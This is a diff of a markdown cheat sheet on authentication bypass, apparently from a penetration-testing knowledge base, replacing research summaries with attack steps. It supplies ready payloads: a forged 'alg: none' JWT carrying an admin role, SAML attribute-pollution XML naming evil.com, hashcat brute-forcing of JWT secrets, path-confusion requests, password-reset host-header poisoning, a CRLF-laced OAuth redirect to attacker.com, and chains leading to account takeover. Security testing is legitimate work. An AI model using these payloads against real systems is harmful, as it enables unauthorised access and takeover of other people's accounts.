@@ -1,54 +1,90 @@
-# auth-bypass-techniques
+# Auth Bypass Techniques
 
+> Authentication bypass — exploiting implementation flaws in identity verification to gain access without valid credentials.
 
-## 2026-04-16
+## Surface
 
-### The Fragile Lock: Novel Bypasses For SAML Authentication
-- **Tags:** `#auth-bypass` `#web`
-- **Severity:** critical · **Hunt:** 5/5 · **Score:** 67.5 · **Status:** poc · **Age:** 0d
-- **Sources:** [1](https://portswigger.net/research/the-fragile-lock)
+- SAML SSO endpoints (`/saml/acs`, `/sso/callback`) — XML parsing vulnerabilities
+- JWT tokens in `Authorization: Bearer` or cookies — algorithm confusion, weak secrets
+- OAuth 2.0 flows — `redirect_uri`, `state` param, implicit grant token leakage
+- Path normalization mismatches between proxy and backend (Nginx/Apache/IIS)
+- Password reset flows — token predictability, host header injection, reuse
+- `Authorization` header stripping by proxy, fallback to unauthenticated handler
+- Multi-step auth with state kept in client-side cookie or hidden field
 
-- Exploits parser-level inconsistencies in the Ruby and PHP SAML ecosystems to achieve full authentication bypass.
-- Leverages attribute pollution techniques where duplicate or conflicting attributes confuse validation logic while remaining valid XML.
-- Utilizes namespace confusion to inject malicious data that the parser processes but security controls fail to detect.
-- Demonstrates that differing interpretations of the SAML standard across libraries create exploitable gaps in trust boundaries.
+## Test Approach
 
-**Practical Takeaways:**
-- When auditing SAML implementations, specifically test for attribute pollution by injecting duplicate attributes with different values or namespaces.
-- Verify how the application handles SAML responses with ambiguous or conflicting namespace definitions to detect parser inconsistencies.
+1. **SAML attribute pollution** — intercept ACS request, duplicate attributes with different namespaces:
+   ```xml
+   <saml:Attribute Name="role">
+     <saml:AttributeValue>user</saml:AttributeValue>
+   </saml:Attribute>
+   <saml:Attribute Name="role" xmlns:saml="http://evil.com">
+     <saml:AttributeValue>admin</saml:AttributeValue>
+   </saml:Attribute>
+   ```
+2. **XML signature wrapping (XSW)** — move the signed element, inject unsigned sibling with attacker data; use SAML Raider (Burp extension)
+3. **JWT `alg: none`** — remove signature, set `"alg": "none"`, see if backend accepts:
+   ```
+   echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
+   ```
+4. **JWT RS256→HS256 confusion** — sign token with server's public key as HMAC secret
+5. **JWT weak secret brute-force**:
+   ```
+   hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
+   ```
+6. **OAuth state CSRF** — remove `state` param from authorization request; if accepted, CSRF to link attacker account
+7. **Open redirect in redirect_uri** — try `redirect_uri=https://target.com/callback/../../../attacker.com`
+8. **Path confusion bypass** (Nginx/Apache):
+   ```
+   GET /app/admin%2F..%2Fapi/sensitive HTTP/1.1
+   GET /app/admin;/api/sensitive HTTP/1.1
+   ```
+9. **Password reset host header injection**:
+   ```
+   POST /reset-password HTTP/1.1
+   Host: attacker.com
+   ```
 
----
-### SAML roulette: chaining attacks for GitLab access
-- **Tags:** `#auth-bypass` `#rails`
-- **Severity:** critical · **Hunt:** 4/5 · **Score:** 54.0 · **Status:** poc · **Age:** 0d
-- **Sources:** [1](https://portswigger.net/research/saml-roulette-the-hacker-always-wins)
+## Tools
 
-- **Insight**: Combines "round-trip" attacks (manipulating SAML responses during the flow) with XML namespace confusion to bypass security controls.
-- **Insight**: Targets the `ruby-saml` library, specifically how it processes XML signatures and namespaces within SAML assertions.
-- **Insight**: Achieves unauthenticated administrative access on GitLab Enterprise by tricking the Service Provider (SP) into accepting a maliciously crafted assertion.
-- **Insight**: Highlights the risk of complex XML parsing logic in SAML libraries, where namespace prefixes can be spoofed to bypass signature validation.
-- **Takeaway**: Audit SAML implementations for namespace confusion by checking if the library correctly verifies canonicalization methods and handles namespace prefixes.
-- **Takeaway**: Test SAML flows for "round-trip" vulnerabilities where a response intended for the IdP can be intercepted, modified, and replayed to the SP.
+- **SAML Raider** (Burp) — XSW attacks, signature stripping, attribute injection
+- **jwt_tool** — test alg confusion, brute-force, claim manipulation; `python3 jwt_tool.py <token> -M at`
+- **hashcat** — JWT HMAC brute-force: `hashcat -a 0 -m 16500`
+- **nuclei** — auth bypass templates: `nuclei -t auth-bypass/ -u https://target.com`
+- **ffuf** — path confusion fuzzing with encoded variants
 
----
-### Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108) — `CVE-2025-0108`
-- **Tags:** `#auth-bypass` `#web`
-- **Severity:** high · **Hunt:** 4/5 · **Score:** 21.0 · **Status:** poc · **Age:** 30d
-- **Sources:** [1](https://www.assetnote.io/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)
+## Payloads / Probes
 
-- **What:** Exploits path handling discrepancies between PAN-OS web server and reverse proxies (Nginx/Apache) to bypass authentication.
-- **Why it matters:** Allows unauthenticated access to protected resources in high-security appliances, potentially compromising entire network segments.
-- **Hunt signal:** Unusual path segment combinations in proxy requests (e.g., double-encoded slashes, mix-case paths)
-- **Evidence:** [source] https://www.assetnote.io/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os · [opinion] Critical due to PAN-OS' role as security perimeter device.
+```
+# JWT none algorithm (header.payload. — no sig)
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
 
-- **Insights:**  
-  - PAN-OS path parsing diverges from Nginx/Apache when handling URL normalization and character encoding.  
-  - Attackers craft requests with crafted paths that bypass reverse proxy checks but exploit PAN-OS' permissive path resolution.  
-  - Affects both direct and reverse-proxy deployment modes.  
-  - Demonstrates configuration-dependent mismatches in web server path resolution.  
+# Path confusion (Nginx strips prefix, Apache doesn't normalize)
+GET /api/v1/admin%2F..%2Fusers HTTP/1.1
 
-- **Takeaways:**  
-  - Implement path normalization consistency between proxy servers and security appliances.  
-  - Audit access logs for path manipulation attempts using regex patterns like `%2f|%2F|%2F%2F`.
+# SAML namespace confusion — inject admin role under different NS
+<Attribute Name="role" xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
+  <AttributeValue>admin</AttributeValue>
+</Attribute>
 
----
+# OAuth open redirect
+?redirect_uri=https://target.com/callback%0d%0aLocation:https://attacker.com
+
+# Cookie prefix bypass (server-side only — inject raw)
+Cookie: __Host-session=attacker_value
+```
+
+## Chain Opportunities
+
+- **Auth bypass → full ATO** — bypass login, access admin panel
+- **SAML bypass → multi-tenant escalation** — assume any tenant's identity in SSO
+- **JWT none → privilege escalation** — forge admin role claim
+- **Path confusion + auth bypass → SSRF** — reach internal endpoints past auth middleware
+- **Password reset + host injection → ATO** — reset link sent to attacker-controlled domain
+
+## Recent Intel
+
+- **The Fragile Lock** · Ruby/PHP SAML attribute pollution + namespace confusion → full auth bypass, PoC published · https://portswigger.net/research/the-fragile-lock
+- **SAML Roulette (GitLab)** · `ruby-saml` XML signature bypass via namespace spoofing → unauthenticated admin access on GitLab Enterprise · https://portswigger.net/research/saml-roulette-the-hacker-always-wins
+- **CVE-2025-0108** · PAN-OS Nginx/Apache path confusion → pre-auth bypass to protected management API · https://www.assetnote.io/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os
